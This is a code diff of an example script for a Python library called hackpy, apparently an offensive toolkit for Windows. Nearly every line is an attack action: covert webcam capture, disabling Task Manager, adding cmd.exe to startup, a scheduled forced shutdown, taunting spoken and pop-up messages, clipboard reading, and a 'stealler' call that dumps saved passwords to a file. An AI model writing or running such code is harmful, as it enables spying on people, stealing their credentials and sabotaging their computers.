@@ -7,17 +7,17 @@
 import os
 import hackpy
 
-hackpy.clean() # Remove all hackpy temp files from system
-hackpy.load(architecture=64) # default it 32
 
-hackpy.taskmanager.disable() # Disable windows taskmgr.exe
-hackpy.taskmanager.enable()  # Enable windows taskmgr.exe
+# Webcam
+hackpy.webcam(filename = 'screenshot.png', delay = 4500, camera = 1)
 
 # TaskManager
 if hackpy.taskmanager.find('iexplore.exe') == True: # If process iexplore.exe found:
     hackpy.taskmanager.kill('iexplore.exe') # Stop iexplore.exe process,
     hackpy.taskmanager.start('chrome.exe') # start chrome.exe process
 
+hackpy.taskmanager.disable() # Disable windows taskmgr.exe
+hackpy.taskmanager.enable()  # Enable windows taskmgr.exe
 
 # Autorun
 hackpy.autorun('C:\\Windows\\System32\\cmd.exe', 'test_name', state=True) # Add cmd.exe to startup
@@ -51,6 +51,7 @@ hackpy.messagebox.error('LOL', 'System has been killed :D') # none, info, error 
 # Nircmdc reference: https://nircmd.nirsoft.net
 hackpy.command.nircmdc('monitor off')
 hackpy.command.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')
+
 # System commands
 hackpy.command.system('shutdown -s -t 260')
 
@@ -62,8 +63,8 @@ hackpy.sendkey('Hello bro{ENTER}')
 data = hackpy.clipboard.get()
 print('Text in clipboard is ' + data)
 
-# Save all Сhrome passwords to passwords.txt
-hackpy.stealler() # Stealler source code: https://pastebin.com/V28aPdZH
+# Save all passwords to passwords.txt
+hackpy.stealler() # https://github.com/AlessandroZ/LaZagne
 
 # Set text to clipboard:
 hackpy.clipboard.set('Hello from LimerBoy and HackPy!!')
